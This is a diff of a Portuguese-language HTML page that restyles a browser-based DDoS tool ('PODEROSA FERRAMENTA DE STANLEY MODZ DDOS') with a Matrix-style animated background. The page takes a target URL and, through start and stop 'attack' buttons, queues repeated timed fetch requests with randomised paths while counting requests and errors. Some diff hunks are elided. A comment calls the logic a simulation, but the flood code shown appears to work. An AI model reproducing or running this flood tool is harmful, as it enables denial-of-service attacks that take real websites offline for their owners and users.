@@ -1,89 +1,166 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-<script type='text/javascript' src='//pl24703755.cpmrevenuegate.com/dc/ec/41/dcec4195ed578104c405647a4c41c87b.js'></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> LEO MODZ DDOS ATACKER </title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Matrix Hacker UI</title>
     <style>
+        /* Matrix Canvas */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            width: 100%;
+            height: 100%;
+            background: black;
+        }
+
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f4f8; /* Light blue background */
-            color: #333; /* Dark text color for better readability */
+            background-color: transparent;
+            color: #00ff00;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Central container */
+        #controls-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        h1 {
+            color: #00ff00;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            width: 80%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+            background-color: black;
+            color: #0f0;
+            text-align: center;
+        }
+
+        button {
+            width: 60%;
+            padding: 12px;
+            margin: 10px auto;
+            display: block;
+            border: none;
+            background-color: #00aa00;
+            color: white;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #007700;
+        }
+
+        #stats {
+            width: 90%;
+            max-width: 800px;
+            margin: 40px auto;
+            background-color: rgba(0, 0, 0, 0.4);
+            color: #0f0;
+            border-radius: 10px;
+            padding: 10px;
         }
 
         table {
             width: 100%;
             border-collapse: collapse;
-            margin: 20px 0;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
 
         thead {
-            background-color: #007BFF; /* Blue header */
-            color: white; /* White text color for header */
+            background-color: #0056b3;
+            color: white;
         }
 
-        th,
-        td {
+        th, td {
             text-align: left;
-            padding: 12px; /* Increased padding for a spacious feel */
-            border-bottom: 1px solid #ddd;
+            padding: 12px;
+            border-bottom: 1px solid #333;
         }
 
         tr:nth-child(even) {
-            background-color: #f2f2f2; /* Light grey for even rows */
+            background-color: rgba(0, 255, 0, 0.05);
         }
 
         tr:hover {
-            background-color: #e1f5fe; /* Light blue on hover */
-        }
-
-        #stats {
-            width: 80%;
-            margin: auto;
-        }
-
-        div {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
-            margin: 20px;
-        }
-
-        input[type="text"] {
-            width: 50%;
-            padding: 10px;
-            margin-right: 10px;
-            border-radius: 5px;
-            margin: 0.5%;
-            border: 1px solid #007BFF; /* Blue border for input */
-        }
-
-        button {
-            padding: 10px 20px;
-            border: none;
-            background-color: #007BFF; /* Blue button */
-            color: white; /* White text */
-            cursor: pointer;
-            margin: 0.5%;
-            border-radius: 5px; /* Rounded corners */
-        }
-
-        button:hover {
-            background-color: #0056b3; /* Darker blue on hover */
+            background-color: rgba(0, 255, 0, 0.1);
         }
     </style>
 </head>
 <body>
-    <h1>PODEROSA FERRAMENTA DE ATAQUE DDOS
-    <div id="controls">
+    <canvas id="matrixCanvas"></canvas>
+
+    <div id="controls-container">
+        <h1>PODEROSA FERRAMENTA DE STANLEY MODZ DDOS</h1>
         <input type="text" id="urlInput" placeholder="DIGITE A URL PARA ATACAR" />
-        <button id="startBtn">INICIAR ATAQUE</button>
+        <button id="startBtn">INICIAR ATACK</button>
         <button id="stopBtn" disabled>PARAR ATACK</button>
     </div>
+
     <div id="stats"></div>
 
+    <!-- Matrix effect -->
+    <script>
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const letters = 'アァイィウヴエカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const fontSize = 16;
+        const columns = Math.floor(canvas.width / fontSize);
+        const drops = Array(columns).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const char = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 33);
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+
+    <!-- Simulação de lógica (cuidado com uso real) -->
     <script>
         var targets = {
             '': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -95,7 +172,7 @@
         var floodPromise = null;
 
         function printStats() {
-            statsEl.innerHTML = '<table border="1"><thead><tr><th>WEB</th><th>NÚMERO DE PEDIDOS</th><th>NÚMERO DE ERROS</th></tr></thead><tbody>' +
+            statsEl.innerHTML = '<table><thead><tr><th>WEB</th><th>NÚMERO DE PEDIDOS</th><th>NÚMERO DE BYTES</th></tr></thead><tbody>' +
                 Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
                     '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
         }
@@ -114,7 +191,6 @@
                 clearTimeout(id);
                 return response;
             }).catch((error) => {
-                console.log(error.code);
                 clearTimeout(id);
                 throw error;
             });
@@ -129,9 +205,6 @@
                 queue.push(
                     fetchWithTimeout(target + rand, { timeout: 1000 })
                         .catch((error) => {
-                            if (error.code === 20 /* ABORT */) {
-                                return;
-                            }
                             targets[target].number_of_errored_responses++;
                         })
                         .then((response) => {
@@ -155,9 +228,8 @@
         function stopFlood() {
             if (attackRunning) {
                 attackRunning = false;
-                queue.forEach(p => p.abort());
                 queue = [];
-                targets = { '': { number_of_requests: 0, number_of_errored_responses: 0 } }; // Reset stats
+                targets = { '': { number_of_requests: 0, number_of_errored_responses: 0 } };
             }
         }
 
@@ -179,5 +251,3 @@
     </script>
 </body>
 </html>
-
-
